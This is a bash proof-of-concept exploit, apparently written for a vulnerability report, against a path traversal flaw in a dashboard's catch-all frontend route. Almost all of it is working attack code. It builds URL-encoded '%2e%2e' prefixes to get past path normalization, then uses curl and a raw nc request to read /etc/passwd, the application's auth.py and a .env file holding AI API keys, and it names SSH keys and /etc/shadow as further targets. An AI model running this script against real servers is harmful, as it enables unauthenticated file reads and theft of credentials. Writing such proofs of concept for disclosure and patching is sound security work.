#!/usr/bin/env bash
# PoC: H5 — Path Traversal in fe_catch_all
# CVE-class: CWE-22 — Improper Limitation of a Pathname to a Restricted Directory
# Affected: dashboard/api.py:146-151  (fe_catch_all handler)
#
# The catch-all route constructs: FE_OUT_DIR / path
# with no is_relative_to() or resolve() containment check.
# URL-encoded dots (%2e%2e) bypass Starlette's literal '..' normalization.
# Requires USE_FE=True (production deployment with built frontend).

TARGET="${1:-http://localhost:9000}"
DEPTH="${2:-7}"   # traversal depth — adjust to reach filesystem root

echo "[*] H5 fe_catch_all Path Traversal PoC"
echo "[*] Target: $TARGET"
echo "[*] Attack uses %2e%2e to bypass Starlette path normalization"
echo ""

# Build traversal prefix (%2e%2e/%2e%2e/...)
PREFIX=""
for i in $(seq 1 $DEPTH); do
    PREFIX="${PREFIX}%2e%2e/"
done

# --- Step 1: read /etc/passwd ---
echo "[1] Attempting to read /etc/passwd via path traversal:"
RESP=$(curl -sv "${TARGET}/${PREFIX}etc/passwd" 2>&1)
HTTP_CODE=$(echo "$RESP" | grep -o "< HTTP/[0-9.]* [0-9]*" | tail -1 | grep -o "[0-9]*$")
echo "    HTTP $HTTP_CODE"
if echo "$RESP" | grep -q "root:"; then
    echo "    [PASS] /etc/passwd contents returned:"
    echo "$RESP" | grep -A5 "root:" | head -10
else
    echo "    Body (first 300): $(echo "$RESP" | tail -20 | head -10)"
fi

# --- Step 2: read dashboard auth.py (reveals DEBUG condition + key logic) ---
echo ""
echo "[2] Reading dashboard/auth.py (reveals auth implementation):"
# Path relative to filesystem root — adjust based on deployment
AUTH_PATH="${PREFIX}Users/bytedance/Desktop/demo/os-twin/dashboard/auth.py"
RESP2=$(curl -s -w "\n__HTTP_%{http_code}__" "${TARGET}/${AUTH_PATH}")
CODE2=$(echo "$RESP2" | grep -o '__HTTP_[0-9]*__' | tr -d '_HTTP_')
echo "    HTTP $CODE2"
if [ "$CODE2" = "200" ]; then
    echo "    [PASS] auth.py returned:"
    echo "$RESP2" | grep -E "(DEBUG|API_KEY|def get_current)" | head -10
fi

# --- Step 3: read .env file (AI provider keys, OSTWIN_API_KEY) ---
echo ""
echo "[3] Attempting to read ~/.ostwin/.env (contains AI API keys):"
HOME_PATH=$(echo "$HOME" | sed 's|^/||')
ENV_TRAVERSAL="${PREFIX}${HOME_PATH}/.ostwin/.env"
RESP3=$(curl -s -w "\n__HTTP_%{http_code}__" "${TARGET}/${ENV_TRAVERSAL}")
CODE3=$(echo "$RESP3" | grep -o '__HTTP_[0-9]*__' | tr -d '_HTTP_')
echo "    HTTP $CODE3"
if [ "$CODE3" = "200" ]; then
    echo "    [PASS] .env file returned (redacted):"
    echo "$RESP3" | grep -v '__HTTP_' | sed 's/=.*/=<REDACTED>/' | head -10
fi

# --- Step 4: raw HTTP proof (bypasses curl URL normalization) ---
echo ""
echo "[4] Raw HTTP request proof (bypasses any client-side normalization):"
HOST=$(echo "$TARGET" | sed 's|http://||' | cut -d/ -f1)
PORT=$(echo "$HOST" | cut -d: -f2)
HOSTNAME=$(echo "$HOST" | cut -d: -f1)
[ -z "$PORT" ] && PORT=9000
printf "GET /%setc/passwd HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n" \
    "$PREFIX" "$HOSTNAME" | nc -q2 "$HOSTNAME" "$PORT" 2>/dev/null | head -20

echo ""
echo "[*] PoC complete."
echo "[*] Security effect: arbitrary file read from server filesystem without authentication."
echo "[*] Sensitive targets: auth.py, .env (API keys), SSH keys, /etc/shadow."
